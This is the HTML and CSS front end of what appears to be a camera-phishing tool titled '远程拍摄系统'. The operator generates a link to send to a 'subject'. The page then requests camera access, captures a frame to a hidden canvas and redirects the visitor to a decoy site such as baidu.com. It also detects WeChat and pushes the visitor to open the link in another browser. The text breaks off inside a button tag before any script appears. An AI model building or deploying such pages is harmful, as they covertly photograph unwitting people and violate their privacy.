<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>远程拍摄系统</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 30px 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 500px;
        }
        h1 { text-align: center; color: #333; margin-bottom: 25px; font-size: 22px; }
        .form-group { margin-bottom: 18px; }
        label { display: block; margin-bottom: 6px; color: #555; font-weight: 500; font-size: 14px; }
        input[type="text"] {
            width: 100%; padding: 12px 14px; border: 2px solid #e0e0e0;
            border-radius: 8px; font-size: 14px; transition: border-color 0.3s;
        }
        input[type="text"]:focus { outline: none; border-color: #667eea; }
        .btn {
            width: 100%; padding: 14px; border: none; border-radius: 8px;
            font-size: 16px; cursor: pointer; transition: all 0.3s; margin-bottom: 12px;
        }
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; font-weight: 600;
        }
        .btn-primary:active { transform: scale(0.98); }
        .link-box {
            margin-top: 18px; padding: 14px; background: #f8f9fa;
            border-radius: 8px; border: 1px dashed #ccc; word-break: break-all;
        }
        .link-box label { font-size: 13px; color: #666; margin-bottom: 8px; }
        #kd { color: #999; font-size: 13px; text-decoration: none; display: block; margin-top: 5px; }
        #copyBtn {
            background: #28a745; color: white; display: none; font-weight: 600;
        }
        #copyBtn:active { background: #218838; }
        .toast {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.8); color: white; padding: 16px 24px;
            border-radius: 8px; font-size: 14px; display: none; z-index: 1000;
            white-space: nowrap;
        }

        /* 拍摄界面 */
        .capture-container {
            display: none; text-align: center; color: white;
            width: 100%; max-width: 500px; padding: 20px;
        }
        .capture-container h2 { margin-bottom: 20px; font-size: 20px; }
        #video {
            width: 100%; max-width: 400px; border-radius: 12px;
            margin-bottom: 20px; transform: scaleX(-1); background: #000;
        }
        #canvas { display: none; }
        .status {
            font-size: 16px; margin: 15px 0; line-height: 1.6; min-height: 24px;
        }
        .btn-allow {
            background: #667eea; color: white; padding: 16px 40px;
            border: none; border-radius: 30px; font-size: 18px;
            cursor: pointer; margin-top: 20px; display: none;
        }
        .btn-allow:active { transform: scale(0.95); }
        .warning-box {
            background: rgba(255,200,0,0.2); border: 1px solid #ffc800;
            border-radius: 8px; padding: 12px; margin: 15px 0;
            color: #ffc800; font-size: 14px; display: none;
        }
        #previewImg {
            width: 100%; max-width: 400px; border-radius: 12px;
            margin: 15px 0; display: none; border: 2px solid white;
        }
    </style>
</head>
<body>

    <!-- 主界面 -->
    <div class="container" id="mainInterface">
        <h1>📷 远程拍摄系统</h1>
        <div class="form-group">
            <label>输入ID：</label>
            <input type="text" id="myid" placeholder="输入您的ID"/>
        </div>
        <div class="form-group">
            <label>拍摄后跳转到：</label>
            <input type="text" id="url" value="http://baidu.com"/>
        </div>
        <button class="btn btn-primary" onclick="generateLink()">生成链接</button>
        <div class="link-box">
            <label>将以下链接发给拍摄对象：</label>
            <a id="kd" style="pointer-events: none;">请先生成链接！</a>
        </div>
        <button id="copyBtn" class="btn" onclick="copyToClipboard()">复制链接</button>
    </div>

    <!-- 拍摄界面 -->
    <div class="capture-container" id="captureInterface">
        <h2 id="captureTitle">正在加载...</h2>
        <div class="warning-box" id="wechatTip">
            ⚠️ 检测到微信浏览器，请按右上角 ⋮ 选择"在浏览器打开"
        </div>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        <img id="previewImg" alt="拍摄结果"/>
        <div class="status" id="status">请允许摄像头权限以继续</div>
        <button class="btn-allow" i
